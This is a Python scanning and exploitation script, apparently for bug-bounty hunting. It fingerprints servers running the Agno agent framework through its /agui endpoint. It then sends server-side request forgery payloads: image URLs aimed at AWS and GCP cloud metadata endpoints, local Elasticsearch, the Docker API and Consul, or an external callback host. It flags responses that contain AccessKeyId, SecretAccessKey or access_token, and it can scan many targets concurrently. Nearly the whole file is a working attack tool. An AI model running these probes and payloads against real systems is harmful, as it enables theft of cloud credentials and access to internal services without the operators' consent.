#!/usr/bin/env python3
"""
agno-hunter.py — 自动探测 H1 目标是否用 Agno 框架 + SSRF 验证

用法:
  python3 agno-hunter.py -l targets.txt                    # 从文件读目标
  python3 agno-hunter.py -u https://target.com              # 单目标
  python3 agno-hunter.py -l targets.txt --no-ssrf           # 只指纹不测SSRF
  python3 agno-hunter.py -l targets.txt -o results.json     # 输出JSON

输入格式 (targets.txt):
  https://target1.com
  https://target2.com:8080
  每行一个

输出:
  - 终端实时显示命中结果
  - 可选 JSON 文件保存
"""

import argparse
import json
import sys
import time
from urllib.parse import urljoin
from datetime import datetime

try:
    import httpx
except ImportError:
    print("[!] 需要 httpx: pip install httpx")
    sys.exit(1)


GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"


def ok(msg):
    print(f"  {GREEN}✓{RESET} {msg}")


def fail(msg):
    print(f"  {RED}✗{RESET} {msg}")


def warn(msg):
    print(f"  {YELLOW}⚠{RESET} {msg}")


def info(msg):
    print(f"  {CYAN}→{RESET} {msg}")


class AgnoHunter:
    def __init__(self, timeout=10):
        self.client = httpx.Client(
            timeout=timeout,
            verify=False,
            headers={"User-Agent": "agno-hunter/1.0"},
        )
        self.results = []

    def close(self):
        self.client.close()

    def probe_openapi(self, base_url):
        """指纹1: 检查 openapi.json 是否包含 /agui + RunAgentInput + AGUI"""
        url = urljoin(base_url.rstrip("/") + "/", "openapi.json")
        try:
            r = self.client.get(url)
            if r.status_code != 200:
                return False, None
            data = r.json()
            paths = data.get("paths", {})
            has_agui = "/agui" in paths
            has_input = any("RunAgentInput" in str(v) for v in data.values())
            if has_agui or has_input:
                endpoints = list(paths.keys())
                return True, {"endpoints": endpoints, "info": data.get("info", {})}
        except Exception:
            pass
        return False, None

    def probe_status(self, base_url):
        """指纹2: /status 端点"""
        url = urljoin(base_url.rstrip("/") + "/", "status")
        try:
            r = self.client.get(url)
            if r.status_code == 200:
                try:
                    data = r.json()
                    if "status" in data:
                        return True, data
                except Exception:
                    pass
            return False, None
        except Exception:
            return False, None

    def probe_validation_error(self, base_url):
        """指纹3: 发空 body 到 /agui，看 422 错误格式"""
        url = urljoin(base_url.rstrip("/") + "/", "agui")
        try:
            r = self.client.post(url, json={})
            if r.status_code == 422:
                body = r.text
                if "threadId" in body and "runId" in body and "Field required" in body:
                    return True, {"status": 422, "detail": r.json().get("detail", [])}
            return False, None
        except Exception:
            return False, None

    def probe_agno(self, base_url):
        """三种指纹综合检测"""
        hits = {}
        evidence = {}

        result, data = self.probe_openapi(base_url)
        if result:
            hits["openapi"] = data
            evidence["openapi"] = "完整API Schema"

        result, data = self.probe_status(base_url)
        if result:
            hits["status"] = data
            evidence["status"] = f'status={data.get("status", "?")}'

        result, data = self.probe_validation_error(base_url)
        if result:
            hits["validation_422"] = data
            evidence["validation_422"] = "FastAPI + agno AGUI 错误格式"

        detected = len(hits) >= 1
        return detected, hits, evidence

    def test_ssrf(self, base_url, callback_url=None, test_internal=False):
        """
        测试 SSRF。发一个带图片URL的消息到 /agui。
        如果 callback_url 有值，用外部监听确认出网。
        否则测内部 metadata。
        """
        results = []

        # SSRF payloads
        targets = []
        if callback_url:
            targets.append(("callback", callback_url, "外部回调验证"))
        if test_internal:
            targets.extend([
                ("aws_meta", "http://169.254.169.254/latest/meta-data/", "AWS metadata"),
                ("gcp_meta", "http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
                ("local_es", "http://127.0.0.1:9200/", "内部 Elasticsearch"),
                ("local_docker", "http://127.0.0.1:2375/version", "内部 Docker API"),
                ("local_consul", "http://127.0.0.1:8500/v1/kv", "内部 Consul"),
            ])

        for tag, url, desc in targets:
            try:
                payload = {
                    "threadId": f"hunt-{int(time.time())}",
                    "runId": f"run-{int(time.time())}",
                    "state": {},
                    "messages": [
                        {
                            "role": "user",
                            "id": "ssrf-test",
                            "content": "raw response only",
                            "images": [{"url": url}]
                        }
                    ],
                    "tools": [],
                    "context": [],
                    "forwardedProps": {},
                }

                endpoint = urljoin(base_url.rstrip("/") + "/", "agui")
                r = self.client.post(endpoint, json=payload, timeout=15)
                body = r.text

                ssrf_result = {
                    "tag": tag,
                    "url": url,
                    "status": r.status_code,
                    "hit": False,
                    "response_preview": body[:500] if body else "",
                }

                # 检查响应是否包含预期内容
                if tag == "aws_meta":
                    ssrf_result["hit"] = any(
                        k in body
                        for k in ["AccessKeyId", "SecretAccessKey", "iam", "role-name"]
                    )
                elif tag == "gcp_meta":
                    ssrf_result["hit"] = "access_token" in body
                else:
                    ssrf_result["hit"] = len(body) > 50 and "no image found" not in body

                results.append(ssrf_result)

            except httpx.TimeoutException:
                results.append({
                    "tag": tag,
                    "url": url,
                    "status": -1,
                    "hit": False,
                    "response_preview": "timeout",
                })
            except Exception as e:
                results.append({
                    "tag": tag,
                    "url": url,
                    "status": -1,
                    "hit": False,
                    "response_preview": str(e)[:100],
                })

        return results

    def hunt(self, base_url, callback_url=None, test_internal=False, no_ssrf=False):
        """对一个目标执行全链路猎杀"""
        result = {
            "url": base_url,
            "timestamp": datetime.now().isoformat(),
            "agno_detected": False,
            "fingerprints": {},
            "ssrf": [],
        }

        print(f"\n{BOLD}▶ 猎杀: {base_url}{RESET}")

        # Phase 1: 指纹探测
        print(f"  {CYAN}[Phase 1] 指纹探测{RESET}")
        detected, hits, evidence = self.probe_agno(base_url)

        if detected:
            result["agno_detected"] = True
            result["fingerprints"] = evidence
            ok(f"检测到 Agno 框架! 命中: {', '.join(evidence.keys())}")

            # Phase 2: SSRF 测试
            if not no_ssrf:
                print(f"  {CYAN}[Phase 2] SSRF 测试{RESET}")
                ssrf_results = self.test_ssrf(base_url, callback_url, test_internal)
                result["ssrf"] = ssrf_results

                for sr in ssrf_results:
                    if sr["hit"]:
                        ok(f"SSRF 命中: {sr['tag']} → {sr['url']}")
                        info(f"  响应片段: {sr['response_preview'][:200]}")
                    else:
                        fail(f"SSRF 未命中: {sr['tag']} → {sr['url']}")
        else:
            result["agno_detected"] = False
            fail("未检测到 Agno 框架")

        self.results.append(result)
        return result


def main():
    parser = argparse.ArgumentParser(
        description="agno-hunter — 自动探测 Agno 框架 + SSRF 验证",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  python3 agno-hunter.py -u https://api.target.com
  python3 agno-hunter.py -l targets.txt -o results.json
  python3 agno-hunter.py -l targets.txt --callback http://your-server:9999/test
        """,
    )
    parser.add_argument("-u", "--url", help="单目标 URL")
    parser.add_argument("-l", "--list", help="目标列表文件，每行一个")
    parser.add_argument("-o", "--output", help="输出 JSON 文件")
    parser.add_argument("--callback", help="外部 SSRF 回调 URL (用于验证出站)")
    parser.add_argument("--internal", action="store_true", help="测试内网服务 (ES, Docker, Consul 等)")
    parser.add_argument("--no-ssrf", action="store_true", help="只检测指纹，不测 SSRF")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数 (默认 10)")
    parser.add_argument("--concurrent", type=int, default=5, help="并发数 (默认 5)")

    args = parser.parse_args()

    if not args.url and not args.list:
        parser.print_help()
        print("\n[!] 必须指定 -u 或 -l")
        sys.exit(1)

    # 收集目标
    targets = []
    if args.url:
        targets.append(args.url.rstrip("/"))
    if args.list:
        with open(args.list) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(line.rstrip("/"))

    print(f"{BOLD}╔════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}║       agno-hunter v1.0                ║{RESET}")
    print(f"{BOLD}╚════════════════════════════════════════╝{RESET}")
    print(f"  目标数: {len(targets)}")
    print(f"  SSRF 测试: {'否(仅指纹)' if args.no_ssrf else '是'}")
    if args.callback:
        print(f"  回调 URL: {args.callback}")
    print()

    hunter = AgnoHunter(timeout=args.timeout)

    try:
        if args.concurrent > 1 and len(targets) > 1:
            from concurrent.futures import ThreadPoolExecutor

            def hunt_target(url):
                return hunter.hunt(
                    url,
                    callback_url=args.callback,
                    test_internal=args.internal,
                    no_ssrf=args.no_ssrf,
                )

            with ThreadPoolExecutor(max_workers=args.concurrent) as pool:
                list(pool.map(hunt_target, targets))
        else:
            for url in targets:
                hunter.hunt(
                    url,
                    callback_url=args.callback,
                    test_internal=args.internal,
                    no_ssrf=args.no_ssrf,
                )
    finally:
        hunter.close()

    # 汇总报告
    total = len(hunter.results)
    hits = [r for r in hunter.results if r["agno_detected"]]
    ssrf_hits = [
        r for r in hunter.results
        if r.get("ssrf") and any(s["hit"] for s in r["ssrf"])
    ]

    print(f"\n{BOLD}══════════════ 猎杀报告 ══════════════{RESET}")
    print(f"  扫描目标: {total}")
    print(f"  Agno 命中: {GREEN}{len(hits)}{RESET}")
    print(f"  SSRF 命中: {GREEN}{len(ssrf_hits)}{RESET}")
    print()

    if hits:
        print(f"{BOLD}命中的目标:{RESET}")
        for h in hits:
            print(f"  {GREEN}+{RESET} {h['url']} [{', '.join(h['fingerprints'].values())}]")
            for s in h.get("ssrf", []):
                if s["hit"]:
                    print(f"    {GREEN}SSRF✓{RESET} {s['tag']}: {s['url']}")

    # 输出 JSON
    if args.output:
        with open(args.output, "w") as f:
            json.dump(
                {
                    "scan_time": datetime.now().isoformat(),
                    "total": total,
                    "agno_hits": len(hits),
                    "ssrf_hits": len(ssrf_hits),
                    "results": hunter.results,
                },
                f,
                indent=2,
                ensure_ascii=False,
            )
        print(f"\n  结果已保存: {args.output}")


if __name__ == "__main__":
    main()
